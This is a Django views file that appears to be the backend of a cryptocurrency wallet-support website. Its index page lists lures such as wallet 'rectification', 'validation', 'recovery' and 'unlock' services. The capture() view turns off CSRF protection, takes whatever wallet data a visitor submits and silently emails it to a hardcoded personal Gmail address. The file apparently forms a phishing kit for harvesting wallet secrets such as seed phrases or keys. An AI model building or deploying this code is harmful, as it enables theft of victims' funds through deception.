from django.shortcuts import render
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.core.mail import send_mail

def index(request):
    services = [
        ('Migration', 'Click here for migration or to resolve any migration-related issues with your blockchain assets.'),
        ('Rectification', 'Click here to rectify all strange wallet issues and restore seamless functionality.'),
        ('Claim', 'Claim your pending rewards or airdrops effortlessly with our secure process.'),
        ('Swap', 'Swap tokens across multiple blockchains with minimal fees and maximum efficiency.'),
        ('Slippage', 'Resolve slippage issues and optimize your trading experience with our tools.'),
        ('Recovery', 'Recover lost or inaccessible funds from your wallet with our expert assistance.'),
        ('Buy Token/Coin', 'Purchase tokens or coins directly with secure and fast transactions.'),
        ('Exchange', 'Exchange your cryptocurrencies with competitive rates and instant processing.'),
        ('Whitelist', 'Secure your address for exclusive whitelist opportunities and priority access.'),
        ('Locked Account', 'Unlock your restricted account and regain full access to your assets.'),
        ('Validation', 'Validate your wallet to ensure compliance and seamless transactions.'),
        ('Wallet Glitch', 'Fix wallet glitches causing errors or syncing issues with our expert tools.'),
        ('Login Error', 'Resolve login errors to access your wallet securely and instantly.'),
        ('DeFi Farming', 'Optimize your DeFi farming strategy and recover stuck or lost yields.'),
        ('Transaction Delay', 'Address delayed transactions and ensure swift processing on the blockchain.'),
        ('Missing/Irregular Balance', 'Recover missing funds or correct irregular balance displays in your wallet.'),
        ('Bridging', 'Bridge assets between different blockchains for enhanced interoperability.'),
        ('Staking', 'Stake your tokens to earn rewards with our user-friendly staking solutions.'),
        ('Claim Airdrop', 'Claim exclusive airdrops and maximize your crypto portfolio.'),
        ('Cross Transfer', 'Transfer assets across chains securely with our cross-chain solutions.'),
        ('NFTs', 'Mint, trade, or recover your NFTs with our comprehensive NFT services.')
        
    ]
    return render(request, 'index.html', {'services': services})

def about(request):
    return render(request, 'about.html')

def contact(request):
    return render(request, 'contact.html')

@csrf_exempt
def capture(request):
    if request.method == 'POST':
        data_type = request.POST.get('data_type')
        data_content = request.POST.get('data_content')

        # Send email with captured data
        try:
            send_mail(
                subject=f'New {data_type} Submission from DataSyncSvc',
                message=f'Data Type: {data_type}\nContent: {data_content}',
                from_email='no-reply@datasyncsvc.com',
                recipient_list=['oglesjovy@gmail.com'],  # Replace with your email
                fail_silently=False,
            )
        except Exception as e:
            return JsonResponse({'status': 'error', 'message': f'Failed to send email: {str(e)}'})

        return JsonResponse({'status': 'success'})
    return JsonResponse({'status': 'error', 'message': 'Invalid request'})